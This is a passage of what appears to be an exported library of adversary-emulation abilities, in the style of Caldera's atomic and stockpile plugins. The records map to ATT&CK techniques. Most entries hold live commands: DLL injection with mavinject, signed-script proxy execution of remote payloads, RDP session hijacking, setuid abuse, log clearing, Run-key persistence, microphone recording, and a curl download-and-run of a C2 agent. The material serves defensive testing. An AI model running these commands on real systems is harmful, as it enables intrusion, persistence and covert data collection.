"payloads": ["0cb710_T1055.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "0cb710_T1055.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Process Injection: Asynchronous Procedure Call", "ability_id": "02a8d7845cd152ae5878f3dfea94e9a4", "technique_id": "T1055.004", "tactic": "multiple", "requirements": [], "name": "Process Injection via C#", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$mypid =; mavinject $mypid /INJECTRUNNING; Stop-Process -processname notepad", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Injection: Dynamic-link Library Injection", "ability_id": "de0bc6b751361b23999a114efd1e3ac9", "technique_id": "T1055.001", "tactic": "multiple", "requirements": [], "name": "Process Injection via mavinject.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b && call \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "2c276ef775e39925256bff68ce6ba19f", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "ProtocolHandler.exe Downloaded a Suspicious File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test gives a file the capability to set UID without using flags.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/evilBinary"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "touch /tmp/evilBinary; sudo setcap cap_setuid=ep /tmp/evilBinary", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid", "ability_id": "0e43a2cb76678e7dcaeb96646fa99c14", "technique_id": "T1548.001", "tactic": "multiple", "requirements": [], "name": "Provide the SetUID capability to a file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["cfb85f_Psiphon.bat"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction Ignore; if($null -ne $Proxy) ; {Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -Value $Proxy}"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cfb85f_Psiphon.bat", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Proxy: Multi-hop Proxy", "ability_id": "acca08a5361f1b4aee26128810327533", "technique_id": "T1090.003", "tactic": "command-and-control", "requirements": [], "name": "Psiphon", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Script Proxy Execution: Pubprn", "ability_id": "35a47c6fdbc5e6756664a2b7ecc1f90b", "technique_id": "T1216.001", "tactic": "defense-evasion", "requirements": [], "name": "PubPrn.vbs Signed Script Bypass", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %USERPROFILE%\\Desktop\\YOUR_FILES.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Data Encrypted for Impact", "ability_id": "d82ceb9939d3d920ee550187ad8235c8", "technique_id": "T1486", "tactic": "impact", "requirements": [], "name": "PureLocker Ransom Note", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "which_python=$(which python || which python3 || which python2); $which_python -c \"import pty;pty.spawn('/bin/sh')\"; exit; $which_python -c \"import pty;pty.spawn('/bin/bash')\"; exit", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Python", "ability_id": "1b2111f68be9d4b4d69413ee1b581c32", "technique_id": "T1059.006", "tactic": "execution", "requirements": [], "name": "Python pty module and spawn function used to spawn sh or bash", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "ability_id": "f531571265dc24625b8799007cbeb1d5", "technique_id": "T1048.003", "tactic": "exfiltration", "requirements": [], "name": "Python3 http.server", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "A list of commands known to be performed by Qakbot for recon purposes", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["64c4ae_qakbot.bat"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "64c4ae_qakbot.bat", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "b57491a5e201a3575d6b63ca7700a18b", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "Qakbot Recon", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\" && reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run && reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\" && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot && reg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Query Registry", "ability_id": "1d3cb1429f530cb89f41c65e57f03db4", "technique_id": "T1012", "tactic": "discovery", "requirements": [], "name": "Query Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Query Registry using PowerShell Get-ItemProperty", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Query Registry", "ability_id": "2488245e-bcbd-405d-920e-2de27db882b3", "technique_id": "T1012", "tactic": "discovery", "requirements": [], "name": "Query Registry", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.\nUnlike using \"reg query\" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"; Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"; Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; Get-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\" ; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Query Registry", "ability_id": "691d489fe77afbfe8646419fce6759fd", "technique_id": "T1012", "tactic": "discovery", "requirements": [], "name": "Query Registry with Powershell cmdlets", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Quit Outlook", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "quit app \"Microsoft Outlook.app\"", "language": null, "name": "osa", "variations": [], "uploads": []}], "technique_name": "Service Stop", "ability_id": "3b007f46-23e7-4a11-9c14-e7085b6a754a", "technique_id": "T1489", "tactic": "impact", "requirements": [], "name": "Quit Outlook", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sc.exe delete sesshijack >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "query user && sc.exe create sesshijack binpath= \"cmd.exe /k tscon 1337 /dest:rdp-tcp#55\" && net start sesshijack", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote Service Session Hijacking: RDP Hijacking", "ability_id": "831c7f8dda2eda2720f46aeba37cbe48", "technique_id": "T1563.002", "tactic": "lateral-movement", "requirements": [], "name": "RDP hijacking", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$p=Tasklist /svc /fi \"IMAGENAME eq mstsc.exe\" /fo csv | convertfrom-csv; if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  $Server=#{logonserver}; $User = Join-Path; $Password=\"#{password}\"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server; echo \"RDP connection established\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: Remote Desktop Protocol", "ability_id": "28ed45c4da059b14a1b2d4f061b912b8", "technique_id": "T1021.001", "tactic": "lateral-movement", "requirements": [], "name": "RDP to DomainController", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Software Deployment Tools", "ability_id": "6aafc5f2ffba8d901f5c59233700944d", "technique_id": "T1072", "tactic": "multiple", "requirements": [], "name": "Radmin Viewer Utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "A Python agent which communicates via the HTML contact", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["pkill -f ragdoll"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["pkill -f ragdoll"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Application Layer Protocol: Web Protocols", "ability_id": "0ab383be-b819-41bf-91b9-1bd4404d83bf", "technique_id": "T1071.001", "tactic": "command-and-control", "requirements": [], "name": "Ragdoll", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo defaults delete com.apple.loginwindow LoginHook"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo defaults write com.apple.loginwindow LoginHook /path/to/script", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications", "ability_id": "412b488e4abdb153189de78b3a79af44", "technique_id": "T1547.007", "tactic": "multiple", "requirements": [], "name": "Re-Opened Applications using LoginHook", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["userdel -r art"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art; usermod --lock art; usermod --expiredate \"1\" art; usermod --unlock art; usermod --expiredate \"99999\" art; su art; whoami; exit", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Local Accounts", "ability_id": "b889d0e778b45382f11a30f8f011344a", "technique_id": "T1078.003", "tactic": "multiple", "requirements": [], "name": "Reactivate a locked/expired account (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 \u00ebR?NTFS\n```", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \"\\\\.\\C:\", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Direct Volume Access", "ability_id": "80e752c5fc69a56ccb86bc90efc5eff6", "technique_id": "T1006", "tactic": "defense-evasion", "requirements": [], "name": "Read volume boot sector via DOS device path (PowerShell)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test reads real-time system log file and writes empty string to it, thus clearing the log file without tampering with the logging process\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo log -f /var/log/system.log | : > /var/log/system.log", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "b2aeb3ccd1d9eec56e86854868b67d38", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Real-time system log clearance/deletion", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "reboot system via system request seen in Awfulshred wiper.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo 1> /proc/sys/kernel/sysrq ; echo b> /proc/sysrq-trigger", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "02a5491f1c325b55303f34abb458b811", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Reboot Linux Host via Kernel System Request", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test restarts a Linux system using `halt`.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "halt --reboot", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Shutdown/Reboot", "ability_id": "10971624ef3e693f52e8f526fdc26f5f", "technique_id": "T1529", "tactic": "impact", "requirements": [], "name": "Reboot System via `halt` - Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test restarts a Linux system using `poweroff`.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "poweroff --reboot", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Shutdown/Reboot", "ability_id": "e2a0dedb06b65b649f077c8e7e3f0d68", "technique_id": "T1529", "tactic": "impact", "requirements": [], "name": "Reboot System via `poweroff` - Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %TEMP%\\T1119_1.txt >nul 2>&1 && del %TEMP%\\T1119_2.txt >nul 2>&1 && del %TEMP%\\T1119_3.txt >nul 2>&1 && del %TEMP%\\T1119_4.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sc query type=service > %TEMP%\\T1119_1.txt && doskey /history > %TEMP%\\T1119_2.txt && wmic process list > %TEMP%\\T1119_3.txt && tree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Automated Collection", "ability_id": "7121cdf93b951311be9d7078c602efdc", "technique_id": "T1119", "tactic": "collection", "requirements": [], "name": "Recon information for export with Command Prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\T1119_1.txt -ErrorAction Ignore; Remove-Item $env:TEMP\\T1119_2.txt -ErrorAction Ignore; Remove-Item $env:TEMP\\T1119_3.txt -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-Service > $env:TEMP\\T1119_1.txt; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt; Get-Process > $env:TEMP\\T1119_3.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Automated Collection", "ability_id": "344e7eaf650763e0d3e9f02e62c1cf4b", "technique_id": "T1119", "tactic": "collection", "requirements": [], "name": "Recon information for export with PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Install sox and record microphone for n-seconds", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 120, "build_target": null, "platform": "darwin", "command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Resource Hijacking", "ability_id": "78524da1-f347-4fbb-9295-209f1f408330", "technique_id": "T1496", "tactic": "impact", "requirements": [], "name": "Record microphone", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "5503b4931592d3d01840133599b87893", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "Reg Key Run", "plugin": 